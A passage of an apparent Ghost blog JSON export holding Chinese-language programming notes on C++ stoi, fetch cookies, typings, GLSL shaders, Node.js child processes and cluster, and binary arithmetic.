std::string str_bin = \\\"-10010110001\\\";\\n  std::string str_auto = \\\"0x7f\\\";\\n\\n  std::string::size_type sz;   // alias of size_t\\n\\n  int i_dec = std::stoi (str_dec,&sz);\\n  int i_hex = std::stoi (str_hex,nullptr,16);\\n  int i_bin = std::stoi (str_bin,nullptr,2);\\n  int i_auto = std::stoi (str_auto,nullptr,0);\\n\\n  std::cout << str_dec << \\\": \\\" << i_dec << \\\" and [\\\" << str_dec.substr(sz) << \\\"]\\\\n\\\";\\n  std::cout << str_hex << \\\": \\\" << i_hex << '\\\\n';\\n  std::cout << str_bin << \\\": \\\" << i_bin << '\\\\n';\\n  std::cout << str_auto << \\\": \\\" << i_auto << '\\\\n';\\n\\n  return 0;\\n}\\n</pre>\\n\\n> Output:\\n```\\n2001, A Space Odyssey: 2001 and [, A Space Odyssey]\\n40c3:  16579\\n-10010110001: -1201\\n0x7f: 127\\n```\\n\\n以前是用的`<sstream>`,封装成如下，还是好用，但是，会每次转换都会生成一个stream对象。会影响性能。应该调用`stream.str(\\\"\\\");stream.clear();`清空，接着转换。\\n\\n<pre class=\\\"brush:cpp;\\\" >\\n\\ttemplate&lt;class out_type, class in_value&gt;\\n\\tout_type convert(const in_value & t)\\n\\t{\\n\\t\\tstringstream stream;\\n\\t\\tstream << t;//向流中传值\\n\\t\\tout_type result;//这里存储转换结果\\n\\t\\tstream >> result;//向result中写入值\\n\\t\\treturn result;\\n\\t}\\n</pre>\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>c++11 <code>&lt;string&gt;</code><br>\n增加了全局函数std::to_string，以及std::stoi/stol/stoll等等函数。</p>\n<pre><code>to_string(int val)  //int，float,long等转string\nint stoi( const std::string&amp; str, size_t *pos = 0, int base = 10 );\nsize_t string转到的下标，若全部可以转成int，则等于str的大小。\nbase 就是进制。\n</code></pre>\n<blockquote>\n<p>stoi</p>\n</blockquote>\n<pre class=\"brush:cpp;\" >\n// stoi example\n#include &lt;iostream&gt;   // std::cout\n#include &lt;string&gt;     // std::string, std::stoi\n\nint main ()\n{\n  std::string str_dec = \"2001, A Space Odyssey\";\n  std::string str_hex = \"40c3\";\n  std::string str_bin = \"-10010110001\";\n  std::string str_auto = \"0x7f\";\n\n  std::string::size_type sz;   // alias of size_t\n\n  int i_dec = std::stoi (str_dec,&sz);\n  int i_hex = std::stoi (str_hex,nullptr,16);\n  int i_bin = std::stoi (str_bin,nullptr,2);\n  int i_auto = std::stoi (str_auto,nullptr,0);\n\n  std::cout << str_dec << \": \" << i_dec << \" and [\" << str_dec.substr(sz) << \"]\\n\";\n  std::cout << str_hex << \": \" << i_hex << '\\n';\n  std::cout << str_bin << \": \" << i_bin << '\\n';\n  std::cout << str_auto << \": \" << i_auto << '\\n';\n\n  return 0;\n}\n</pre>\n<blockquote>\n<p>Output:</p>\n</blockquote>\n<pre><code>2001, A Space Odyssey: 2001 and [, A Space Odyssey]\n40c3:  16579\n-10010110001: -1201\n0x7f: 127\n</code></pre>\n<p>以前是用的<code>&lt;sstream&gt;</code>,封装成如下，还是好用，但是，会每次转换都会生成一个stream对象。会影响性能。应该调用<code>stream.str(&quot;&quot;);stream.clear();</code>清空，接着转换。</p>\n<pre class=\"brush:cpp;\" >\n\ttemplate&lt;class out_type, class in_value&gt;\n\tout_type convert(const in_value & t)\n\t{\n\t\tstringstream stream;\n\t\tstream << t;//向流中传值\n\t\tout_type result;//这里存储转换结果\n\t\tstream >> result;//向result中写入值\n\t\treturn result;\n\t}\n</pre>\n<!--kg-card-end: markdown-->","comment_id":"65","plaintext":"c++11 <string>\n增加了全局函数std::to_string，以及std::stoi/stol/stoll等等函数。\n\nto_string(int val)  //int，float,long等转string\nint stoi( const std::string& str, size_t *pos = 0, int base = 10 );\nsize_t string转到的下标，若全部可以转成int，则等于str的大小。\nbase 就是进制。\n\n\n> stoi\n\n\n\n// stoi example\n#include <iostream>   // std::cout\n#include <string>     // std::string, std::stoi\n\nint main ()\n{\n  std::string str_dec = \"2001, A Space Odyssey\";\n  std::string str_hex = \"40c3\";\n  std::string str_bin = \"-10010110001\";\n  std::string str_auto = \"0x7f\";\n\n  std::string::size_type sz;   // alias of size_t\n\n  int i_dec = std::stoi (str_dec,&sz);\n  int i_hex = std::stoi (str_hex,nullptr,16);\n  int i_bin = std::stoi (str_bin,nullptr,2);\n  int i_auto = std::stoi (str_auto,nullptr,0);\n\n  std::cout << str_dec << \": \" << i_dec << \" and [\" << str_dec.substr(sz) << \"]\\n\";\n  std::cout << str_hex << \": \" << i_hex << '\\n';\n  std::cout << str_bin << \": \" << i_bin << '\\n';\n  std::cout << str_auto << \": \" << i_auto << '\\n';\n\n  return 0;\n}\n\n\n> Output:\n\n\n2001, A Space Odyssey: 2001 and [, A Space Odyssey]\n40c3:  16579\n-10010110001: -1201\n0x7f: 127\n\n\n以前是用的<sstream>,封装成如下，还是好用，但是，会每次转换都会生成一个stream对象。会影响性能。应该调用\nstream.str(\"\");stream.clear();清空，接着转换。\n\n\n\ttemplate<class out_type, class in_value>\n\tout_type convert(const in_value & t)\n\t{\n\t\tstringstream stream;\n\t\tstream << t;//向流中传值\n\t\tout_type result;//这里存储转换结果\n\t\tstream >> result;//向result中写入值\n\t\treturn result;\n\t}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-10-14T10:19:42.000Z","created_by":"1","updated_at":"2017-03-29T02:30:09.000Z","updated_by":"1","published_at":"2016-10-14T10:35:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2ff","uuid":"428a4686-3130-41d7-97a2-fe389e867b2c","title":"fetch踩坑","slug":"fetchcai-keng","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"今天在用fetch发请求的时候，发现session获取不到，以为express配置问题。检查之后，发现服务器获取不到cookie，在fetch请求中也不能设置cookie，当然session出问题。fetch要加配置`credentials: 'include'`\\n。如下：\\n<pre class=\\\"brush:js;\\\" >\\nfetch('/users/login', {\\n    method: \\\"post\\\",\\n    headers: {\\n      'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'\\n    }, \\n    credentials: 'include',\\n    body: parseParam(userObj)\\n  });\\nfetch('/users/checkLogin',{method:'get',credentials: 'include'});\\n</pre>\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>今天在用fetch发请求的时候，发现session获取不到，以为express配置问题。检查之后，发现服务器获取不到cookie，在fetch请求中也不能设置cookie，当然session出问题。fetch要加配置<code>credentials: 'include'</code><br>\n。如下：</p>\n<pre class=\"brush:js;\" >\nfetch('/users/login', {\n    method: \"post\",\n    headers: {\n      'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'\n    }, \n    credentials: 'include',\n    body: parseParam(userObj)\n  });\nfetch('/users/checkLogin',{method:'get',credentials: 'include'});\n</pre><!--kg-card-end: markdown-->","comment_id":"66","plaintext":"今天在用fetch发请求的时候，发现session获取不到，以为express配置问题。检查之后，发现服务器获取不到cookie，在fetch请求中也不能设置cookie，当然session出问题。fetch要加配置\ncredentials: 'include'\n。如下：\n\n\nfetch('/users/login', {\n    method: \"post\",\n    headers: {\n      'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'\n    }, \n    credentials: 'include',\n    body: parseParam(userObj)\n  });\nfetch('/users/checkLogin',{method:'get',credentials: 'include'});","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-10-21T07:44:41.000Z","created_by":"1","updated_at":"2016-10-21T07:54:37.000Z","updated_by":"1","published_at":"2016-10-21T07:54:37.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d300","uuid":"c6875359-454a-4458-a492-eb6d69a96195","title":"typings使用","slug":"typingsshi-yong","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 介绍\\n\\ntypings是tsd的升级版。typings是一个智能代码提示插件。在VS CODE中使用，很方便。对于JS代码，提示是非强制的,只提示。对于ts就会在错误的地方标红。\\n\\n> 安装\\n\\n`npm install -g typings`\\n\\n> 使用\\n\\n* 初始化`typings init`会生成一个`typings.json`\\n* 搜索node提示`typings search node`\\n* 安装node提示`typings install dt~node --save --global`\\n\\n> 启用智能提示功能\\n\\n1.装好后一般都会提示了。jsconfig.json的exclude属性，不要乱加文件夹，这是一个排除文件的属性，一般把`\\\"node_modules/\\\"`排除就行。\\n\\n2.要是不行，只需要在需要提示的文件最上行增加dt文件所在目录，，格式如下:\\n`/// <reference path=\\\"./typings/index.d.ts\\\" />`\\n\\n> 其他\\n\\n*.d.ts文件就是typescript的各种声明。以前是ts专用的，现在可以用在js智能提示了。\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>介绍</p>\n</blockquote>\n<p>typings是tsd的升级版。typings是一个智能代码提示插件。在VS CODE中使用，很方便。对于JS代码，提示是非强制的,只提示。对于ts就会在错误的地方标红。</p>\n<blockquote>\n<p>安装</p>\n</blockquote>\n<p><code>npm install -g typings</code></p>\n<blockquote>\n<p>使用</p>\n</blockquote>\n<ul>\n<li>初始化<code>typings init</code>会生成一个<code>typings.json</code></li>\n<li>搜索node提示<code>typings search node</code></li>\n<li>安装node提示<code>typings install dt~node --save --global</code></li>\n</ul>\n<blockquote>\n<p>启用智能提示功能</p>\n</blockquote>\n<p>1.装好后一般都会提示了。jsconfig.json的exclude属性，不要乱加文件夹，这是一个排除文件的属性，一般把<code>&quot;node_modules/&quot;</code>排除就行。</p>\n<p>2.要是不行，只需要在需要提示的文件最上行增加dt文件所在目录，，格式如下:<br>\n<code>/// &lt;reference path=&quot;./typings/index.d.ts&quot; /&gt;</code></p>\n<blockquote>\n<p>其他</p>\n</blockquote>\n<p>*.d.ts文件就是typescript的各种声明。以前是ts专用的，现在可以用在js智能提示了。</p>\n<!--kg-card-end: markdown-->","comment_id":"67","plaintext":"> 介绍\n\n\ntypings是tsd的升级版。typings是一个智能代码提示插件。在VS\nCODE中使用，很方便。对于JS代码，提示是非强制的,只提示。对于ts就会在错误的地方标红。\n\n> 安装\n\n\nnpm install -g typings\n\n> 使用\n\n\n * 初始化typings init会生成一个typings.json\n * 搜索node提示typings search node\n * 安装node提示typings install dt~node --save --global\n\n> 启用智能提示功能\n\n\n1.装好后一般都会提示了。jsconfig.json的exclude属性，不要乱加文件夹，这是一个排除文件的属性，一般把\"node_modules/\"排除就行。\n\n2.要是不行，只需要在需要提示的文件最上行增加dt文件所在目录，，格式如下:\n/// <reference path=\"./typings/index.d.ts\" />\n\n> 其他\n\n\n*.d.ts文件就是typescript的各种声明。以前是ts专用的，现在可以用在js智能提示了。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-10-26T06:57:10.000Z","created_by":"1","updated_at":"2016-10-26T08:02:58.000Z","updated_by":"1","published_at":"2016-10-26T08:02:58.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d301","uuid":"9d5df263-11ca-492b-87a5-9d789b6067cd","title":"OpenGl学习1--基础","slug":"xss","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"* VERTEX SHADER\\n```\\nprecision highp float;\\n\\n// Attributes\\nattribute vec3 position;\\nattribute vec2 uv;\\n\\n// Uniforms\\nuniform mat4 worldViewProjection;\\n\\n// Varying\\nvarying vec2 vUV;\\n\\nvoid main(void) {\\n    gl_Position = worldViewProjection * vec4(position, 1.0);\\n\\n    vUV = uv;\\n}\\n```\\n* PIXEL (FRAGMENT) SHADER\\n```\\nprecision highp float;\\n\\nvarying vec2 vUV;\\n\\nuniform sampler2D textureSampler;\\n\\nvoid main(void) {\\n    gl_FragColor = texture2D(textureSampler, vUV);\\n}\\n```\\n> uniform变量\\n\\nuniform变量是外部程序传递给（vertex和fragment）shader的变量。uniform变量就像是C语言里面\\n\\n的常量（const），它不能被shader程序修改。==uniform变量一般用来表示：变换矩阵，材质，光照参数和颜色等信息。==\\n\\n> attribute变量\\n\\nattribute变量是只能在vertex shader中使用的变量。一般用attribute变量来表示一些顶点的数据，如：顶点坐标，法线，纹理坐标(uv)，顶点颜色等。\\n\\n> varying变量\\n\\nvarying变量是vertex shader向fragment shader传递数据用的。fragment shader是不能直接获取uv的，但是可以用varying接收vertex shader传来的。\\n\\n其他，更加多的glsl数据结构可以到 https://my.oschina.net/sweetdark/blog/208024 看。\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><ul>\n<li>VERTEX SHADER</li>\n</ul>\n<pre><code>precision highp float;\n\n// Attributes\nattribute vec3 position;\nattribute vec2 uv;\n\n// Uniforms\nuniform mat4 worldViewProjection;\n\n// Varying\nvarying vec2 vUV;\n\nvoid main(void) {\n    gl_Position = worldViewProjection * vec4(position, 1.0);\n\n    vUV = uv;\n}\n</code></pre>\n<ul>\n<li>PIXEL (FRAGMENT) SHADER</li>\n</ul>\n<pre><code>precision highp float;\n\nvarying vec2 vUV;\n\nuniform sampler2D textureSampler;\n\nvoid main(void) {\n    gl_FragColor = texture2D(textureSampler, vUV);\n}\n</code></pre>\n<blockquote>\n<p>uniform变量</p>\n</blockquote>\n<p>uniform变量是外部程序传递给（vertex和fragment）shader的变量。uniform变量就像是C语言里面</p>\n<p>的常量（const），它不能被shader程序修改。<mark>uniform变量一般用来表示：变换矩阵，材质，光照参数和颜色等信息。</mark></p>\n<blockquote>\n<p>attribute变量</p>\n</blockquote>\n<p>attribute变量是只能在vertex shader中使用的变量。一般用attribute变量来表示一些顶点的数据，如：顶点坐标，法线，纹理坐标(uv)，顶点颜色等。</p>\n<blockquote>\n<p>varying变量</p>\n</blockquote>\n<p>varying变量是vertex shader向fragment shader传递数据用的。fragment shader是不能直接获取uv的，但是可以用varying接收vertex shader传来的。</p>\n<p>其他，更加多的glsl数据结构可以到 <a href=\"https://my.oschina.net/sweetdark/blog/208024\">https://my.oschina.net/sweetdark/blog/208024</a> 看。</p>\n<!--kg-card-end: markdown-->","comment_id":"68","plaintext":" * VERTEX SHADER\n\nprecision highp float;\n\n// Attributes\nattribute vec3 position;\nattribute vec2 uv;\n\n// Uniforms\nuniform mat4 worldViewProjection;\n\n// Varying\nvarying vec2 vUV;\n\nvoid main(void) {\n    gl_Position = worldViewProjection * vec4(position, 1.0);\n\n    vUV = uv;\n}\n\n\n * PIXEL (FRAGMENT) SHADER\n\nprecision highp float;\n\nvarying vec2 vUV;\n\nuniform sampler2D textureSampler;\n\nvoid main(void) {\n    gl_FragColor = texture2D(textureSampler, vUV);\n}\n\n\n> uniform变量\n\n\nuniform变量是外部程序传递给（vertex和fragment）shader的变量。uniform变量就像是C语言里面\n\n的常量（const），它不能被shader程序修改。uniform变量一般用来表示：变换矩阵，材质，光照参数和颜色等信息。\n\n> attribute变量\n\n\nattribute变量是只能在vertex\nshader中使用的变量。一般用attribute变量来表示一些顶点的数据，如：顶点坐标，法线，纹理坐标(uv)，顶点颜色等。\n\n> varying变量\n\n\nvarying变量是vertex shader向fragment shader传递数据用的。fragment\nshader是不能直接获取uv的，但是可以用varying接收vertex shader传来的。\n\n其他，更加多的glsl数据结构可以到 https://my.oschina.net/sweetdark/blog/208024 看。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-11-15T16:32:58.000Z","created_by":"1","updated_at":"2016-12-22T08:11:32.000Z","updated_by":"1","published_at":"2016-12-22T08:11:32.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d302","uuid":"9e2f3c03-dedd-4008-aafa-44aa2107a4c3","title":"nodejs多进程","slug":"nodejsduo-jin-cheng","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"node.js是单线程,异步架构，无法却利用多个核心。当然也有通过tagg，可以实现多线程。不过我还是觉得多进程+异步更好用，更简单地实现多核心编程。\\n>子进程 child_process模块\\n\\n这个可以创建子线程\\n\\n* spawn函数用给定的命令发布一个子进程，只能运行指定的程序，参数需要在列表中给出,如下:\\n```\\nvar child_process = require('child_process');\\nvar child = child_process.spawn( command );\\nchild.stdout.on('data', function(data) {\\nconsole.log(data);\\n});\\n```\\n* exec也是一个创建子进程的函数，与spawn函数不同它可以直接接受一个回调函数作为参数，回调函数有三个参数，分别是err, stdout , stderr，基本使用方法如下：\\n\\n```\\nvar child_process = require('child_process');\\nchild_process.exec( command , function(err, stdout , stderr ) {\\nconsole.log( stdout );\\n});\\n```\\n* execFileexecFile函数与exec函数类似，但execFile函数更显得精简，因为它可以直接执行所指定的文件，基本使用方法如下：\\n```\\nvar child_process = require('child_process');\\nchild_process.execFile( file , function(err, stdout , stderr ) {\\nconsole.log( stdout );\\n});\\n```\\n* forkfork函数可直接运行Node.js模块，所以我们可以直接通过指定模块路径而直接进行操作。使用方法如下:\\n```\\nvar child_process = require('child_process');\\nchild_process.fork( modulePath );\\n```\\n该方法实现ChildProcess实例所具有的所有方法，最主要的是他可以在进程间通信。\\n\\n>cluster\\n\\ncluster是Nodejs自带的多核处理模块。封装的child_process.fork方法。\\n官方[api](https://nodejs.org/api/cluster.html#cluster_cluster)\\n```\\nconst cluster = require('cluster');\\nconst http = require('http');\\nconst numCPUs = require('os').cpus().length;\\n\\nif (cluster.isMaster) {\\n  // Fork workers.\\n  for (var i = 0; i < numCPUs; i++) {\\n    cluster.fork();\\n  }\\n\\n  cluster.on('exit', (worker, code, signal) => {\\n    console.log(`worker ${worker.process.pid} died`);\\n  });\\n} else {\\n  // Workers can share any TCP connection\\n  // In this case it is an HTTP server\\n  http.createServer((req, res) => {\\n    res.writeHead(200);\\n    res.end('hello world\\\\n');\\n  }).listen(8000);\\n}\\n//输出\\n$ NODE_DEBUG=cluster node server.js\\n23521,Master Worker 23524 online\\n23521,Master Worker 23526 online\\n23521,Master Worker 23523 online\\n23521,Master Worker 23528 online\\n```\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>node.js是单线程,异步架构，无法却利用多个核心。当然也有通过tagg，可以实现多线程。不过我还是觉得多进程+异步更好用，更简单地实现多核心编程。</p>\n<blockquote>\n<p>子进程 child_process模块</p>\n</blockquote>\n<p>这个可以创建子线程</p>\n<ul>\n<li>spawn函数用给定的命令发布一个子进程，只能运行指定的程序，参数需要在列表中给出,如下:</li>\n</ul>\n<pre><code>var child_process = require('child_process');\nvar child = child_process.spawn( command );\nchild.stdout.on('data', function(data) {\nconsole.log(data);\n});\n</code></pre>\n<ul>\n<li>exec也是一个创建子进程的函数，与spawn函数不同它可以直接接受一个回调函数作为参数，回调函数有三个参数，分别是err, stdout , stderr，基本使用方法如下：</li>\n</ul>\n<pre><code>var child_process = require('child_process');\nchild_process.exec( command , function(err, stdout , stderr ) {\nconsole.log( stdout );\n});\n</code></pre>\n<ul>\n<li>execFileexecFile函数与exec函数类似，但execFile函数更显得精简，因为它可以直接执行所指定的文件，基本使用方法如下：</li>\n</ul>\n<pre><code>var child_process = require('child_process');\nchild_process.execFile( file , function(err, stdout , stderr ) {\nconsole.log( stdout );\n});\n</code></pre>\n<ul>\n<li>forkfork函数可直接运行Node.js模块，所以我们可以直接通过指定模块路径而直接进行操作。使用方法如下:</li>\n</ul>\n<pre><code>var child_process = require('child_process');\nchild_process.fork( modulePath );\n</code></pre>\n<p>该方法实现ChildProcess实例所具有的所有方法，最主要的是他可以在进程间通信。</p>\n<blockquote>\n<p>cluster</p>\n</blockquote>\n<p>cluster是Nodejs自带的多核处理模块。封装的child_process.fork方法。<br>\n官方<a href=\"https://nodejs.org/api/cluster.html#cluster_cluster\">api</a></p>\n<pre><code>const cluster = require('cluster');\nconst http = require('http');\nconst numCPUs = require('os').cpus().length;\n\nif (cluster.isMaster) {\n  // Fork workers.\n  for (var i = 0; i &lt; numCPUs; i++) {\n    cluster.fork();\n  }\n\n  cluster.on('exit', (worker, code, signal) =&gt; {\n    console.log(`worker ${worker.process.pid} died`);\n  });\n} else {\n  // Workers can share any TCP connection\n  // In this case it is an HTTP server\n  http.createServer((req, res) =&gt; {\n    res.writeHead(200);\n    res.end('hello world\\n');\n  }).listen(8000);\n}\n//输出\n$ NODE_DEBUG=cluster node server.js\n23521,Master Worker 23524 online\n23521,Master Worker 23526 online\n23521,Master Worker 23523 online\n23521,Master Worker 23528 online\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"69","plaintext":"node.js是单线程,异步架构，无法却利用多个核心。当然也有通过tagg，可以实现多线程。不过我还是觉得多进程+异步更好用，更简单地实现多核心编程。\n\n> 子进程 child_process模块\n\n\n这个可以创建子线程\n\n * spawn函数用给定的命令发布一个子进程，只能运行指定的程序，参数需要在列表中给出,如下:\n\nvar child_process = require('child_process');\nvar child = child_process.spawn( command );\nchild.stdout.on('data', function(data) {\nconsole.log(data);\n});\n\n\n * exec也是一个创建子进程的函数，与spawn函数不同它可以直接接受一个回调函数作为参数，回调函数有三个参数，分别是err, stdout ,\n   stderr，基本使用方法如下：\n\nvar child_process = require('child_process');\nchild_process.exec( command , function(err, stdout , stderr ) {\nconsole.log( stdout );\n});\n\n\n * execFileexecFile函数与exec函数类似，但execFile函数更显得精简，因为它可以直接执行所指定的文件，基本使用方法如下：\n\nvar child_process = require('child_process');\nchild_process.execFile( file , function(err, stdout , stderr ) {\nconsole.log( stdout );\n});\n\n\n * forkfork函数可直接运行Node.js模块，所以我们可以直接通过指定模块路径而直接进行操作。使用方法如下:\n\nvar child_process = require('child_process');\nchild_process.fork( modulePath );\n\n\n该方法实现ChildProcess实例所具有的所有方法，最主要的是他可以在进程间通信。\n\n> cluster\n\n\ncluster是Nodejs自带的多核处理模块。封装的child_process.fork方法。\n官方api [https://nodejs.org/api/cluster.html#cluster_cluster]\n\nconst cluster = require('cluster');\nconst http = require('http');\nconst numCPUs = require('os').cpus().length;\n\nif (cluster.isMaster) {\n  // Fork workers.\n  for (var i = 0; i < numCPUs; i++) {\n    cluster.fork();\n  }\n\n  cluster.on('exit', (worker, code, signal) => {\n    console.log(`worker ${worker.process.pid} died`);\n  });\n} else {\n  // Workers can share any TCP connection\n  // In this case it is an HTTP server\n  http.createServer((req, res) => {\n    res.writeHead(200);\n    res.end('hello world\\n');\n  }).listen(8000);\n}\n//输出\n$ NODE_DEBUG=cluster node server.js\n23521,Master Worker 23524 online\n23521,Master Worker 23526 online\n23521,Master Worker 23523 online\n23521,Master Worker 23528 online","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-08-23T08:45:39.000Z","created_by":"1","updated_at":"2016-08-23T08:57:02.000Z","updated_by":"1","published_at":"2016-08-23T08:57:02.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d303","uuid":"07445d78-9049-4a6a-b052-c96f6ff9a01b","title":"二进制乘法，除法","slug":"er-jin-zhi-cheng-fa-chu-fa","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"1.乘法\\n由于计算机中，所有数值都是用2的N次方来表示的:2^n0+2^n1+2^n2+2^n3+2^n4.....\\n因此x*y,(x)*(2^n0+2^n1+2^n2+2^n3+2^n4)=(x*2^n0)+(x*2^n1)+(x*2^n2)+(x*2^n3)+(x*2^n4)+......即(x左移n0)+(x左移n1)+(x左移n2)+(x左移n3)+(x左移n4)+......\\n\\n用15(x)*13(y)来举例，15*13 为1111*1101\\n\\na.首先y的最低位为1(2^0)，x左移0位得到1111\\nb.然后y的最低第二位为0，没有2^1存在，因此本次无运算(结果可以看作为0)\\nc.然后y的最低第三位为1(2^2)，x左移2位得到111100\\nd.然后y的最低第四位为1(2^3)，x左移3位得到1111000\\ne.把a、b、c、d的结果相加1111+0+111100+1111000=11000011(195),该结果就是乘法的结果\\n\\n2.除法(加减交替法)\\nx/y其实就是，x不断减y的过程。小学时候学的长长除法就是这个原理。\\n用二进制的除法x/y，比十进制容易写，商不是0即是1，而且如果除数大于除数的1倍，商就是标记在另一个位上面了\\n\\n用85/6来举例,85/6=1010101/110\\n\\na.101(0101)左移1位到第3位都小于110，因此商=000\\nb.1010(101)左移四位是1010,比110大，商=0001,余数=1010-110=100(101)\\nc.余数100(101)左移一位是1001,比110大，商=00011,余数=1001-110=11(01)\\nd.余数11(01)左移一位是110,等于110，商=000111,余数=0(1)\\ne.余数0(1)左移一位是01,小于110,商=0001110,余数=01\\n\\n因此85/6=1010101/110=0001110，即14，余数为最后的余数1\\n\\n[计算机乘法除法原理(原码)](http://blog.sina.com.cn/s/blog_ad0672d60101j69f.html)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>1.乘法<br>\n由于计算机中，所有数值都是用2的N次方来表示的:2^n0+2^n1+2^n2+2^n3+2^n4.....<br>\n因此x<em>y,(x)</em>(2^n0+2^n1+2^n2+2^n3+2^n4)=(x<em>2^n0)+(x</em>2^n1)+(x<em>2^n2)+(x</em>2^n3)+(x*2^n4)+......即(x左移n0)+(x左移n1)+(x左移n2)+(x左移n3)+(x左移n4)+......</p>\n<p>用15(x)<em>13(y)来举例，15</em>13 为1111*1101</p>\n<p>a.首先y的最低位为1(2^0)，x左移0位得到1111<br>\nb.然后y的最低第二位为0，没有2^1存在，因此本次无运算(结果可以看作为0)<br>\nc.然后y的最低第三位为1(2^2)，x左移2位得到111100<br>\nd.然后y的最低第四位为1(2^3)，x左移3位得到1111000<br>\ne.把a、b、c、d的结果相加1111+0+111100+1111000=11000011(195),该结果就是乘法的结果</p>\n<p>2.除法(加减交替法)<br>\nx/y其实就是，x不断减y的过程。小学时候学的长长除法就是这个原理。<br>\n用二进制的除法x/y，比十进制容易写，商不是0即是1，而且如果除数大于除数的1倍，商就是标记在另一个位上面了</p>\n<p>用85/6来举例,85/6=1010101/110</p>\n<p>a.101(0101)左移1位到第3位都小于110，因此商=000<br>\nb.1010(101)左移四位是1010,比110大，商=0001,余数=1010-110=100(101)<br>\nc.余数100(101)左移一位是1001,比110大，商=00011,余数=1001-110=11(01)<br>\nd.余数11(01)左移一位是110,等于110，商=000111,余数=0(1)<br>\ne.余数0(1)左移一位是01,小于110,商=0001110,余数=01</p>\n<p>因此85/6=1010101/110=0001110，即14，余数为最后的余数1</p>\n<p><a href=\"http://blog.sina.com.cn/s/blog_ad0672d60101j69f.html\">计算机乘法除法原理(原码)</a></p>\n<!--kg-card-end: markdown-->","comment_id":"70","plaintext":"1.乘法\n由于计算机中，所有数值都是用2的N次方来表示的:2^n0+2^n1+2^n2+2^n3+2^n4.....\n因此xy,(x)(2^n0+2^n1+2^n2+2^n3+2^n4)=(x2^n0)+(x2^n1)+(x2^n2)+(x\n2^n3)+(x*2^n4)+......即(x左移n0)+(x左移n1)+(x左移n2)+(x左移n3)+(x左移n4)+......\n\n用15(x)13(y)来举例，1513 为1111*1101\n\na.首先y的最低位为1(2^0)，x左移0位得到1111\nb.然后y的最低第二位为0，没有2^1存在，因此本次无运算(结果可以看作为0)\nc.然后y的最低第三位为1(2^2)，x左移2位得到111100\nd.然后y的最低第四位为1(2^3)，x左移3位得到1111000\ne.把a、b、c、d的结果相加1111+0+111100+1111000=11000011(195),该结果就是乘法的结果\n\n2.除法(加减交替法)\nx/y其实就是，x不断减y的过程。小学时候学的长长除法就是这个原理。\n用二进制的除法x/y，比十进制容易写，商不是0即是1，而且如果除数大于除数的1倍，商就是标记在另一个位上面了\n\n用85/6来举例,85/6=1010101/110\n\na.101(0101)左移1位到第3位都小于110，因此商=000\nb.1010(101)左移四位是1010,比110大，商=0001,余数=1010-110=100(101)\nc.余数100(101)左移一位是1001,比110大，商=00011,余数=1001-110=11(01)\nd.余数11(01)左移一位是110,等于110，商=000111,余数=0(1)\ne.余数0(1)左移一位是01,小于110,商=0001110,余数=01\n\n因此85/6=1010101/110=0001110，即14，余数为最后的余数1\n\n计算机乘法除法原理(原码) [http://blog.sina.com.cn/s/blog_ad0672d60101j69f.html]","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-10-14T08:52:23.000Z","created_by":"1","updated_at":"2017-04-04T16:51:40.000Z","updated_by":"1","published_at":"2016-10-14T08:56:44.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d304","uuid":"5f8c5c5b-3144-4591-88d7-2865fff23d8f","title":"大数乘法","slug":"da-shu-cheng-fa","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"在计算机中，int只有32位，long long也就64位。\\n```\\n#define INT_MIN     (-2147483647 - 1) // minimum 